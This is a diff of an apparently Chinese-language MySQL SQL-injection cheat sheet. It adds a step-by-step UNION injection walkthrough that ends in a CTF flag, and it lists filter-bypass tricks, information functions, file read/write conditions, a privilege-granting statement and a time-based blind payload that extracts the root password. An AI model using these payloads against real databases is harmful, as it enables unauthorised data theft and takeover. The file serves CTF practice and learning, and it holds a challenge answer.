@@ -1,23 +1,27 @@
 **0x00 mysql一般注入(select)**
+>  1.  ‘ union select 1,2,database()# ->  **news**
+	2.  ‘ union select 1,2,group_concat(table_name) from 	information_schema.tables where table_schema=’news’# ->  **news,secret_table**
+	3.  ‘ union select 1,2,group_concat(column_name) from information_schema.columns where table_name=’secret_table’# ->  **id,fl4g**
+	4.  ‘ union select 1,2,fl4g from secret_table# ->  **QCTF{sq1_inJec7ion_ezzz}**
 
-1. 注释符
+5. 注释符
 `#`  
 `/*`
 `—`
 
-2. 过滤空格注入
+6. 过滤空格注入
 使用/**/或()或+代替空格
 %0c = form feed, new page  
 %09 = horizontal tab  
 %0d = carriage return  
 %0a = line feed, new line
 
-3. 多条数据显示
+7. 多条数据显示
 concat()  
 group_concat()  
 concat_ws()
 
-4. 相关函数
+8. 相关函数
 system_user() 系统用户名  
 user() 用户名  
 current_user 当前用户名  
@@ -30,7 +34,7 @@ load_file() MYSQL读取本地文件的函数
 @@version_compile_os 操作系统 Windows Server 2003
 GRANT ALL PRIVILEGES ON *.* TO ‘root’@’%’ IDENTIFIED BY ‘123456’ WITH GRANT OPTION;
 
-5. mysql一般注入语句
+9. mysql一般注入语句
 猜字段数
 order by n/*  
 查看mysql基本信息  
@@ -50,7 +54,7 @@ and 1=2 union select 1,2,3,字段1,5,字段2,7,8 from 数据库.表/*
 and (select count(*) from mysql.user)>0/*  
 and (select count(file_priv) from mysql.user)>0/*
 
-6. mysql读取写入文件
+10. mysql读取写入文件
 必备条件：
 读：file权限必备
 写：1.绝对路径 2.union使用 3. 可以使用”
@@ -116,5 +120,5 @@ and 1=(SELECT 1 FROM information_schema.tables WHERE TABLE_SCHEMA=”blind_sqli�
 
 UNION SELECT IF(SUBSTRING(Password,1,1)=’a’,BENCHMARK(100000,SHA1(1)),0) User,Password FROM mysql.user WHERE User = ‘root’
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbLTQ0NjIyNTMwNF19
+eyJoaXN0b3J5IjpbNjI0MzA0Mjk4LC00NDYyMjUzMDRdfQ==
 -->
